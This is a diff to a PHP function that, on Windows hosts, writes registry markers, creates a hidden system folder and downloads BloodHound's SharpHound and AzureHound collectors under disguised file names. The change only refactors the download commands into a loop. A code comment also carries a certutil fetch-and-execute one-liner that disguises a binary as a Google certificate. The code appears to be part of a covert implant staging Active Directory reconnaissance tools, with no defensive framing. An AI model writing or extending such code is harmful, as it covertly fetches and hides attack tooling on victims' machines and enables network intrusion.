@@ -18,6 +18,11 @@ use Amp\Loop;
 
 function checkfs(){
     if (substr(php_uname(), 0, 7) == 'Windows') {
+        $bh = array(
+            "af.ps1"=>"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1",
+            "af1.ps1"=>"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1",
+            "af2.exe"=>"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true"
+        );
         //certutil.exe -urlcache -split -f [URL] google_https_cert.exe && google_https_cert.exe
         $wh = new COM('WScript.Shell');
         if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Path"))) {
@@ -27,9 +32,9 @@ function checkfs(){
             $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash", "REG_SZ", uuid);
             system("mkdir " . $t);
             system("attrib +h +s " . $t);
-            system("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile " . $t . "\\af.ps1");
-            system("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile " . $t . "\\af1.ps1");
-            system("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile " . $t . "\\af2.exe");
+            foreach ($bh as $hound => $value) {
+                system("Invoke-WebRequest -Uri $value -OutFile " . $t . "\\$hound");
+            }
             system("attrib +r +s $t\\*");
             fwrite(fopen(sys_get_temp_dir()."/aa", "a"), "win");
             return $t;
